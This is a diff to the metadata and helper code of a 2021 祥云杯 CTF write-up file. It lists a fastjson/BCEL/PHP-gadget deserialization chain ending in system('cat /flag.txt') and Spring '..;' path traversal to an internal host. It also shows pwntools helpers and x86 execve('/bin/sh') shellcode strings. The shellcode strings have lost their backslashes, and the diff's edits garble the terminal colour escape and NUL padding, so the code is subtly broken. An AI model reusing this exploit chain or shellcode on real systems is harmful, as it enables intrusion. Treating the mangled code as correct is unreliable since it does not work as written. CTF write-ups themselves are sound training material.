@@ -12,7 +12,15 @@ tags:
 - OpisClosure
 - 内网穿透
 - Spring路径穿越
-attack_chain: 内网fastjson反序列化→BCEL字节码执行→CodeceptionExtensionRunProcess链→GuzzleHttpPsr7AppendStream→CachingStream→PumpStream→OpisClosure序列化system('cat /flag.txt')→/admin/test路径穿越
+attack_chain:
+- '内网fastjson反序列化'
+- 'BCEL字节码执行'
+- 'CodeceptionExtensionRunProcess链'
+- 'GuzzleHttpPsr7AppendStream'
+- 'CachingStream'
+- 'PumpStream'
+- 'OpisClosure序列化system(''cat /flag.txt'')'
+- '/admin/test路径穿越'
 key_payload: $$BCEL$$字节码;CodeceptionExtensionRunProcess;GuzzleHttpPsr7AppendStream/CachingStream/PumpStream;OpisClosureserialize system('cat /flag.txt');fastjson反序列化;10.10.1.11:8080/xxxx/..;/admin/test
 one_liner: 祥云杯fastjson反序列化+BCEL字节码+Codeception/Guzzle/OpisClosure多链触发system
 lesson: fastjson+BCEL+Spring路径穿越(..;)+Codeception/Guzzle/OpisClosure gadget链组合
@@ -52,6 +60,9 @@ prerequisites:
 - BCEL 字节码加载原理
 - PHP 反序列化 POP 链构造
 - Spring/Tomcat URL 解析与路径穿越
+contest_normalized: "祥云杯"
+contest_year: 2021
+subcategory_guess: "deserialization"
 ---
 # 祥云杯-WriteUp
 
@@ -671,9 +682,9 @@ r       = lambda numb=4096          :p.recv(numb)
 ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
 it      = lambda                    :p.interactive()
 uu32    = lambda data   :
-u32(data.ljust(4, ' '))
+u32(data.ljust(4, '\\x00'))
 uu64    = lambda data   :
-u64(data.ljust(8, ' '))
+u64(data.ljust(8, '\\x00'))
 bp      = lambda bkp                :
 pdbg.bp(bkp)
 li      = lambda str1,data1         :
@@ -684,7 +695,7 @@ def dbgc(addr):
  gdb.attach(p,"b*" + hex(addr) +"n c")
 
 def lg(s,addr):
-    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(s,addr))
+    print('\\x0033[1;31;40m%20s-->0x%x\\x0033[0m'%(s,addr))
 
 sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
 sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
